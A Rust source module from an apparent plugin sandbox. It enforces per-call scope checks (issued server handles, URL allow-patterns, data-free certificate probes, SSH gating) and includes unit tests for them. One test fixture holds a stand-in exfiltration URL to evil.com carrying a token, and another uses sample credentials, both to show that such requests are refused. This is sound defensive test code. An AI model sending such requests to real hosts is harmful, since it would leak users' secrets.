//! What one instance carries, and the checks that cannot be made when the
//! bindings are installed.
//!
//! Section 6.2 draws the line: a host function the manifest did not ask for is
//! a stub, decided once when `sb` is built. What is left here is the part that
//! depends on the argument — which address, which server — and that is checked
//! per call because there is no earlier moment where the value exists.

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};

use serde_json::Value;

use crate::bridge::HostBridge;
use crate::error::Refusal;
use crate::hostfn::HostFn;
use crate::permission::{Grants, Permission};

pub(crate) struct State {
    pub plugin_id: String,
    pub instance_id: String,
    pub bridge: Arc<dyn HostBridge>,
    pub grants: Grants,

    /// Plugin settings plus this server's config for this plugin, flattened to
    /// strings — what `sb.config.get` answers.
    pub config: BTreeMap<String, String>,

    /// Set when a call was refused, and read after the call has run.
    ///
    /// JavaScript has no uncatchable throw: a plugin can `catch` a refusal and
    /// carry on as though the call had worked. For a confirmation dialog that
    /// is the difference between a machine that was powered off with consent
    /// and one that was not, so the refusal is recorded here and the call is
    /// failed by the host regardless of what the plugin answered.
    pub refusal: Mutex<Option<Refusal>>,

    /// Server handles the host has issued to this instance: the bound server,
    /// plus whatever `sb.ui.pickServer` returned.
    ///
    /// A handle is opaque here — the app maps it back to a server id. What this
    /// set is for is that a plugin cannot *invent* one, which is the whole of
    /// what "the plugin only acts on servers it was given" means.
    pub server_handles: Mutex<BTreeSet<String>>,
}

impl State {
    /// Records a refusal. The first one is kept: it is the one that changed
    /// what the plugin could do.
    pub(crate) fn refuse(&self, refusal: Refusal) {
        let mut held = self.refusal.lock().expect("poisoned");
        if held.is_none() {
            *held = Some(refusal);
        }
    }

    pub(crate) fn take_refusal(&self) -> Option<Refusal> {
        self.refusal.lock().expect("poisoned").take()
    }

    /// The check that could not be made when `sb` was built.
    ///
    /// Called with the argument the plugin passed, before the bridge sees it.
    pub(crate) fn verify_scope(&self, func: HostFn, request: &[u8]) -> Result<(), Refusal> {
        let name = || func.path();
        match func {
            HostFn::ServerExec | HostFn::NavOpenServer => {
                let req = parse(func, request)?;
                self.check_handle(func, &req)?;
            }
            HostFn::HttpFetch => {
                let req = parse(func, request)?;
                let url = req.get("url").and_then(Value::as_str).ok_or_else(|| {
                    Refusal::BadRequest { function: name(), detail: "no `url`".into() }
                })?;
                if !self.grants.allows_url(url) {
                    // The host, not the URL: an error naming the whole URL
                    // would put a path — and whatever a plugin put in a query
                    // string — into a log line.
                    return Err(Refusal::OutOfScope {
                        function: name(),
                        detail: format!("`net.http` does not cover {}", host_of(url)),
                    });
                }

                // What makes it safe to accept any certificate for the review
                // step is that nothing is sent. Enforced here rather than
                // described, because the whole point of the step is reaching a
                // peer nobody has vouched for.
                if req.get("probeCert").and_then(Value::as_bool).unwrap_or(false) {
                    let carries = |k: &str| match req.get(k) {
                        None | Some(Value::Null) => false,
                        Some(Value::Array(a)) => !a.is_empty(),
                        Some(Value::Object(o)) => !o.is_empty(),
                        Some(Value::String(s)) => !s.is_empty(),
                        Some(_) => true,
                    };
                    if carries("body") || carries("headers") {
                        return Err(Refusal::OutOfScope {
                            function: name(),
                            detail: "`probeCert` sends nothing, so it takes no body or headers"
                                .into(),
                        });
                    }
                }

                match req.get("via").and_then(Value::as_str).unwrap_or("direct") {
                    "direct" => {}
                    "ssh" => {
                        if !self.grants.allows(Permission::ServerStream) {
                            return Err(Refusal::OutOfScope {
                                function: name(),
                                detail: "`via: \"ssh\"` needs `server.stream`".into(),
                            });
                        }
                        self.check_handle(func, &req)?;
                    }
                    other => {
                        return Err(Refusal::BadRequest {
                            function: name(),
                            detail: format!("unknown `via`: {other}"),
                        });
                    }
                }
            }
            HostFn::UiPatch
            | HostFn::UiPrompt
            | HostFn::UiPickServer
            | HostFn::UiToast
            | HostFn::StoreGet
            | HostFn::StoreSet
            | HostFn::StoreList
            | HostFn::DiagCrumb
            | HostFn::NavGoTab
            | HostFn::ClipboardRead
            | HostFn::ClipboardWrite => {}
        }
        Ok(())
    }

    fn check_handle(&self, func: HostFn, req: &Value) -> Result<(), Refusal> {
        let handle = req.get("server").and_then(Value::as_str).ok_or_else(|| {
            Refusal::BadRequest { function: func.path(), detail: "no `server` handle".into() }
        })?;
        if !self.server_handles.lock().expect("poisoned").contains(handle) {
            return Err(Refusal::OutOfScope {
                function: func.path(),
                detail: "server handle was not issued to this instance".into(),
            });
        }
        Ok(())
    }

    /// Records a handle the host just minted, so the next call may use it.
    ///
    /// The one place a plugin's reachable set grows, and it grows only through
    /// a picker the user drove.
    pub(crate) fn record_response(&self, func: HostFn, response: &[u8]) {
        if func != HostFn::UiPickServer {
            return;
        }
        let Ok(value) = serde_json::from_slice::<Value>(response) else { return };
        if let Some(handle) = value.get("server").and_then(Value::as_str) {
            self.server_handles.lock().expect("poisoned").insert(handle.to_string());
        }
    }

    pub(crate) fn issue_handle(&self, handle: impl Into<String>) {
        self.server_handles.lock().expect("poisoned").insert(handle.into());
    }
}

fn parse(func: HostFn, request: &[u8]) -> Result<Value, Refusal> {
    serde_json::from_slice(request).map_err(|e| Refusal::BadRequest {
        function: func.path(),
        detail: format!("not JSON: {e}"),
    })
}

/// The authority of `url`, for an error message. Never the path or the query.
fn host_of(url: &str) -> &str {
    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    rest.split(['/', '?', '#']).next().unwrap_or("")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::bridge::{CallCtx, HostCall};
    use crate::hostfn::LogLevel;

    struct NoBridge;
    impl HostBridge for NoBridge {
        fn call(&self, _: CallCtx<'_>, _: HostFn, _: &[u8]) -> HostCall {
            unreachable!("scope checks run before the bridge")
        }
        fn log(&self, _: CallCtx<'_>, _: LogLevel, _: &str) {}
    }

    fn state(grants: Grants, handles: &[&str]) -> State {
        State {
            plugin_id: "p".into(),
            instance_id: "i".into(),
            bridge: Arc::new(NoBridge),
            grants,
            config: BTreeMap::new(),
            refusal: Mutex::new(None),
            server_handles: Mutex::new(handles.iter().map(|s| s.to_string()).collect()),
        }
    }

    fn http_grants() -> Grants {
        Grants::new([Permission::NetHttp]).with_http_patterns(["10.0.0.9".to_string()])
    }

    #[test]
    fn an_unissued_server_handle_is_out_of_scope() {
        let s = state(Grants::new([Permission::ServerExec]), &["h1"]);
        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h1","script":"id"}"#).is_ok());
        let err =
            s.verify_scope(HostFn::ServerExec, br#"{"server":"h2","script":"id"}"#).unwrap_err();
        assert!(matches!(err, Refusal::OutOfScope { .. }));
    }

    #[test]
    fn a_url_outside_the_pattern_is_out_of_scope_and_the_path_is_not_reported() {
        let s = state(http_grants(), &[]);
        assert!(s.verify_scope(HostFn::HttpFetch, br#"{"url":"https://10.0.0.9/x"}"#).is_ok());
        let err = s
            .verify_scope(HostFn::HttpFetch, br#"{"url":"https://evil.com/steal?tok=abc"}"#)
            .unwrap_err();
        let Refusal::OutOfScope { detail, .. } = &err else { panic!("{err}") };
        assert!(detail.contains("evil.com"));
        assert!(!detail.contains("steal"), "{detail}");
        assert!(!detail.contains("tok"), "{detail}");
    }

    #[test]
    fn via_ssh_needs_server_stream_as_well_as_net_http() {
        let s = state(http_grants(), &["h1"]);
        let req = br#"{"url":"https://10.0.0.9/","via":"ssh","server":"h1"}"#;
        assert!(matches!(
            s.verify_scope(HostFn::HttpFetch, req).unwrap_err(),
            Refusal::OutOfScope { .. }
        ));

        let s = state(
            Grants::new([Permission::NetHttp, Permission::ServerStream])
                .with_http_patterns(["10.0.0.9".to_string()]),
            &["h1"],
        );
        assert!(s.verify_scope(HostFn::HttpFetch, req).is_ok());
    }

    #[test]
    fn via_ssh_is_still_held_to_the_http_patterns() {
        let s = state(
            Grants::new([Permission::NetHttp, Permission::ServerStream])
                .with_http_patterns(["10.0.0.9".to_string()]),
            &["h1"],
        );
        let req = br#"{"url":"https://10.0.0.10/","via":"ssh","server":"h1"}"#;
        assert!(matches!(
            s.verify_scope(HostFn::HttpFetch, req).unwrap_err(),
            Refusal::OutOfScope { .. }
        ));
    }

    #[test]
    fn a_cert_probe_that_carries_anything_is_refused() {
        let s = state(http_grants(), &[]);
        let ok = br#"{"url":"https://10.0.0.9/","probeCert":true}"#;
        assert!(s.verify_scope(HostFn::HttpFetch, ok).is_ok());

        for bad in [
            &br#"{"url":"https://10.0.0.9/","probeCert":true,"body":"pw=hunter2"}"#[..],
            &br#"{"url":"https://10.0.0.9/","probeCert":true,"headers":{"Authorization":"Basic x"}}"#[..],
        ] {
            assert!(
                matches!(
                    s.verify_scope(HostFn::HttpFetch, bad).unwrap_err(),
                    Refusal::OutOfScope { .. }
                ),
                "{}",
                String::from_utf8_lossy(bad)
            );
        }
    }

    /// An empty body or header object is not "carrying" anything, and refusing
    /// it would refuse the request every probe actually makes.
    #[test]
    fn a_cert_probe_with_empty_fields_is_still_a_probe() {
        let s = state(http_grants(), &[]);
        let req = br#"{"url":"https://10.0.0.9/","probeCert":true,"headers":{},"body":null}"#;
        assert!(s.verify_scope(HostFn::HttpFetch, req).is_ok());
    }

    #[test]
    fn a_cert_probe_is_still_held_to_the_http_patterns() {
        let s = state(http_grants(), &[]);
        let req = br#"{"url":"https://evil.com/","probeCert":true}"#;
        assert!(matches!(
            s.verify_scope(HostFn::HttpFetch, req).unwrap_err(),
            Refusal::OutOfScope { .. }
        ));
    }

    #[test]
    fn an_unknown_via_is_refused_rather_than_treated_as_direct() {
        let s = state(http_grants(), &[]);
        let req = br#"{"url":"https://10.0.0.9/","via":"unix"}"#;
        assert!(matches!(
            s.verify_scope(HostFn::HttpFetch, req).unwrap_err(),
            Refusal::BadRequest { .. }
        ));
    }

    #[test]
    fn picking_a_server_is_what_grows_the_handle_set() {
        let s = state(Grants::new([Permission::ServerExec]), &[]);
        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_err());
        s.record_response(HostFn::UiPickServer, br#"{"server":"h9"}"#);
        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_ok());
    }

    #[test]
    fn a_handle_in_any_other_response_is_ignored() {
        let s = state(Grants::new([Permission::ServerExec]), &[]);
        s.record_response(HostFn::ServerExec, br#"{"server":"h9"}"#);
        s.record_response(HostFn::StoreGet, br#"{"server":"h9"}"#);
        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_err());
    }
}
